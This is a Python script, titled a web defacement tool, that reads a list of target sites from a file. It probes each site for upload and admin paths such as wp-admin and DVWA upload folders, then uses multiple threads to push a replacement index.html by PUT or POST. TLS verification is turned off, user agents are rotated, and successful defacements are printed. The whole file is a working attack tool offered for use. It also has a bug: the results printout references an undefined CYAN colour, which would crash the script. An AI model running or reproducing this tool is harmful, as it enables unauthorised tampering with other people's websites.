#!/usr/bin/env python3
"""
AUTO-PATH WEB DEFACEMENT TOOL
Features:
- Automatic path discovery for common vulnerabilities
- Smart URL normalization
- Multi-threaded scanning
- Built-in bypass techniques
- No manual path configuration needed
"""

import os
import sys
import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import warnings

# Disable warnings
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

# Configuration
MAX_THREADS = 20
TIMEOUT = 15
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F)'
]

# Auto-generated path database
AUTO_PATHS = {
    'default': [
        'admin/', 'upload.php', 'uploads/', 'wp-admin/', 
        'filemanager/', 'assets/upload.php', 'inc/uploads/',
        'hackable/uploads/', 'vulnerabilities/upload/'
    ],
    'dvwa': [
        'dvwa/', 'hackable/uploads/', 'vulnerabilities/upload/',
        'dvwa/login.php', 'dvwa/instructions.php'
    ],
    'wordpress': [
        'wp-admin/', 'wp-login.php', 'wp-content/uploads/',
        'wp-admin/admin-ajax.php'
    ]
}

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'

class AutoDefacer:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        self.session.verify = False
        self.success = 0
        self.failed = 0

    def _get_site_type(self, url):
        """Auto-detect site type for path generation"""
        try:
            r = self.session.get(url, timeout=TIMEOUT)
            if 'dvwa' in r.text.lower():
                return 'dvwa'
            elif 'wordpress' in r.text.lower():
                return 'wordpress'
        except:
            pass
        return 'default'

    def _generate_paths(self, base_url):
        """Generate target paths based on site type"""
        site_type = self._get_site_type(base_url)
        paths = AUTO_PATHS[site_type] + AUTO_PATHS['default']
        
        # Normalize URLs
        normalized = []
        for path in paths:
            if not base_url.endswith('/') and not path.startswith('/'):
                normalized.append(f"{base_url}/{path}")
            else:
                normalized.append(f"{base_url}{path}")
        return list(set(normalized))  # Remove duplicates

    def _try_upload(self, url):
        """Attempt file upload to target"""
        try:
            with open('index.html', 'rb') as f:
                # Try PUT first
                r = self.session.put(url, data=f, timeout=TIMEOUT)
                if r.status_code in [200, 201, 204]:
                    return True
                
                # Try POST if PUT fails
                f.seek(0)
                files = {'file': ('index.html', f)}
                r = self.session.post(url, files=files, timeout=TIMEOUT)
                return r.status_code == 200
        except:
            return False

    def _check_and_deface(self, url):
        """Check path and attempt defacement"""
        try:
            # Check if path exists
            r = self.session.head(url, timeout=TIMEOUT)
            if r.status_code == 200:
                # Attempt defacement
                if self._try_upload(url):
                    verify_url = urljoin(url, "index.html")
                    verify = self.session.get(verify_url, timeout=TIMEOUT)
                    if verify.status_code == 200:
                        print(f"{Colors.GREEN}[+] Defaced: {verify_url}{Colors.RESET}")
                        return True
        except:
            pass
        return False

    def attack_site(self, base_url):
        """Main attack sequence"""
        print(f"\n{Colors.BLUE}[*] Attacking {base_url}{Colors.RESET}")
        
        # Generate target paths
        target_urls = self._generate_paths(base_url)
        print(f"{Colors.YELLOW}[*] Generated {len(target_urls)} test paths{Colors.RESET}")
        
        # Multi-threaded attack
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(self._check_and_deface, url) for url in target_urls]
            for future in as_completed(futures):
                if future.result():
                    self.success += 1
                    break
            else:
                self.failed += 1
                print(f"{Colors.RED}[-] Failed: {base_url}{Colors.RESET}")

def main():
    # Check files
    if not os.path.exists('listsite.txt'):
        print(f"{Colors.RED}[!] Missing listsite.txt{Colors.RESET}")
        return
        
    if not os.path.exists('index.html'):
        print(f"{Colors.RED}[!] Missing index.html{Colors.RESET}")
        return

    # Load targets
    with open('listsite.txt') as f:
        targets = [line.strip() for line in f if line.strip()]

    print(f"""
{Colors.PURPLE}
  ____      _    ___ ___ _   _ _____ 
 / ___|    / \  |_ _/ _ \ | | |_   _|
| |  _    / _ \  | | | | | | | | | |  
| |_| |  / ___ \ | | |_| | |_| | | |  
 \____| /_/   \_\___\___/ \___/  |_|  
{Colors.RESET}""")

    tool = AutoDefacer()
    
    # Process all targets
    for target in targets:
        tool.attack_site(target)

    # Results
    print(f"\n{Colors.CYAN}[*] Results:{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Success: {tool.success}{Colors.RESET}")
    print(f"{Colors.RED}[-] Failed: {tool.failed}{Colors.RESET}")

if __name__ == "__main__":
    main()
